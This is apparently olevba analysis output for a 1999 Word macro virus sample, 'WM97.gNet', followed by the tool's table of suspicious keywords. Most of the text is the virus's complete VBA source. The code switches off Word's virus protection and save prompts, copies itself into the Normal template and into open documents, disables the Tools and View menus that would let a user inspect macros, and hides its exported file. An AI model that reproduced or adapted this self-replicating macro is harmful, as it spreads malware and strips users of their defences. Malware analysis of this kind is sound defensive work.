olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.dr
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.dr - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO gnet.bas 
in file: Virus.MSWord.VMPCK1.dr - OLE stream: 'Macros/VBA/gnet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This is gNet Macro Virus
' (c) 1999 by ksg
' astigmatiZm virus group
' www.astigmatiZm.cjb.net
' rename this file to gNet.bas and import it in MS Words Visual Basic Editor to activate

'

'     WM97.gNet
' ---------------------
' (c) by KSG [ AMACC ]
' ---------------------
'   [ Astig Matizm ]
'
    
Sub gnet()
On Error Resume Next
Set a = NormalTemplate: Set b = a.VBProect
Set c = b.VBComponents(1): Set d = c.Item
Set vp = Options.VirusProtection
Options.ConfirmConversions = False
vp = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)
b.VBComponents("gnet").Export "c:\gnet.vxd"
ActiveDocument.ReadOnlyRecommended = False
If d("gnet").Name <> "gnet" Then
NotYet = True
If ActiveDocument.VBProject.VBComponents.Item("gnet").Name <> "gnet" Then Still = True
If NotYet = True And Still = False Then Set Blink1 = NormalTemplate.VBProject.VBComponents
If NotYet = False And Still = True Then Set Blink1 = ActiveDocument.VBProject.VBComponents
Blink1.import "c:\gnet.vxd"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If Still = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("view").Controls("Status Bar").Enabled = False
Shell "attrib +h gnet.vxd", vbHide
End Sub

Sub AutoExec()
    On Error Resume Next
    If Day(Now()) = 10 And Month(Now()) = 9 Then
Call HelpAbout
End If
Call gnet
End Sub

Sub HelpAbout()
    On Error Resume Next
    Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "g N e t , 2 1 , k s g"
.Heading = "gNeT [ ksg / astigmatiZm ]"
.Animation = msoAnimationSearching
.Show
End With
Assistant.Visible = False
Call gnet
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

